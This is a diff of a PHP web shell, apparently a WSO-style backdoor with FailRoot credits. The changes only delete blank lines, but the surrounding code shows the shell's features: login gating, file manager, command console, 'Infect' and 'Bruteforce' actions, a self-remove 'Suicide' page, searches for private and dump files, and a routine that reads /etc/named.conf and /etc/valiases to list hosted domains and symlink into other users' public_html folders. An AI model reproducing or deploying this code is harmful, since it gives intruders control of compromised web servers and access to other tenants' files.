@@ -37,7 +37,6 @@ if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
 		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
 	else
 		printLogin();
-
 if( strtolower( substr(PHP_OS,0,3) ) == "win" )
 	$os = 'win';
 else
@@ -116,7 +115,6 @@ else
 		"locate dump files" => "locate dump",
 		"locate priv files" => "locate priv"	
 	);
-
 function printHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = "UTF-8";
@@ -259,7 +257,6 @@ function printHeader() {
 		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
 		 '<table cellpadding=3 cellspacing=0 width=100% style="background-color:teal;"><tr>'.$menu.'</tr></table><div>';
 }
-
 function printFooter() {
 	$is_writable = is_writable($GLOBALS['cwd'])?"<font color=teal>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
 ?>
@@ -323,7 +320,6 @@ function viewSize($s) {
 	else
 		return $s . ' B';
 }
-
 function perms($p) {
 	if (($p & 0xC000) == 0xC000)$i = 's';
 	elseif (($p & 0xA000) == 0xA000)$i = 'l';
@@ -434,7 +430,6 @@ function actionSecInfo() {
 	echo '</div>';
 	printFooter();
 }
-
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
 		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
@@ -470,7 +465,6 @@ function actionPhp() {
 	echo '</pre></div>';
 	printFooter();
 }
-
 function actionFilesMan() {
 	printHeader();
 	echo '<h1>File manager</h1><div class=content>';
@@ -624,7 +618,6 @@ function actionFilesMan() {
 	<?php
 	printFooter();
 }
-
 function actionStringTools() {
 	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
     if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
@@ -681,7 +674,6 @@ function actionStringTools() {
 			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
 			<tr><td></td><td><input type='submit' value='>>'></td></tr>
 			</table></form>";
-
 	function printRecursiveGlob($path) {
 		if(substr($path, -1) != '/')
 			$path.='/';
@@ -714,7 +706,6 @@ function actionStringTools() {
 		</form></div>";
 	printFooter();
 }
-
 function actionFilesTools() {
 	if( isset($_POST['p1']) )
 		$_POST['p1'] = urldecode($_POST['p1']);
@@ -733,7 +724,6 @@ function actionFilesTools() {
 				fclose($fp);
 			}
 		} elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {
-
 		}
 		exit;
 	}
@@ -867,7 +857,6 @@ function actionFilesTools() {
 	echo '</div>';
 	printFooter();
 }
-
 function actionSafeMode() {
 	$temp='';
 	ob_start();
@@ -920,7 +909,6 @@ function actionSafeMode() {
 	echo '</div>';
 	printFooter();
 }
-
 function actionConsole() {
 	if(isset($_POST['ajax'])) {
 		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
@@ -987,12 +975,10 @@ function add(cmd) {
 	echo '</form></div><script>document.cf.cmd.focus();</script>';
 	printFooter();
 }
-
 function actionLogout() {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 	echo 'bye!';
 }
-
 function actionSelfRemove() {
 	printHeader();
 	if($_POST['p1'] == 'yes') {
@@ -1004,13 +990,11 @@ function actionSelfRemove() {
 	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
 	printFooter();
 }
-
 function actionTools() {
 	printHeader();
 	
 		printFooter();
 }
-
 function actionDomains() {
 	printHeader();
 	error_reporting(0);
@@ -1022,37 +1006,25 @@ $f = fopen ('sym/.htaccess','w');
  fwrite($f , $c);
  
 $d0mains = @file("/etc/named.conf");
-
 if(!$d0mains){ die("<b>#Error... -> [ /etc/named.conf ]"); }
-
 echo "<table align=center border=1>
 <tr bgcolor=teal><td>Domain</td><td>User List </td><td>Symlink</td></tr>";
-
 foreach($d0mains as $d0main){
-
 if(eregi("zone",$d0main)){
-
 preg_match_all('#zone "(.*)"#', $d0main, $domains);
 flush();
-
 if(strlen(trim($domains[1][0])) > 2){
-
 $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
-
 echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td><td><a href='sym/x.txt/home/".$user['name']."/public_html'>Miremos</a></td></tr>"; flush();
-
 }}}
-
 echo "</table> 
 <p align='center'> 
 FailRoot'Cod3rz <a href='http://failroot.wordpress.com/'>FailRoot-Sec.Com</a> | <a  
-
 href='http://wWw.sEc4EvEr.CoM/'>wWw.sEc4EvEr.CoM</a><br> 
 </p> 
 "; 
 	printFooter();
 }
-
 function actionInfect() {
 	printHeader();
 	echo '<h1>Infect</h1><div class=content>';
@@ -1092,7 +1064,6 @@ function actionInfect() {
 		}
 	printFooter();
 }
-
 function actionBruteforce() {
 	printHeader();
 	if( isset($_POST['proto']) ) {
@@ -1176,7 +1147,6 @@ function actionBruteforce() {
 	echo '</div><br>';
 	printFooter();
 }
-
 function actionSql() {
 	class DbClass {
 		var $type;
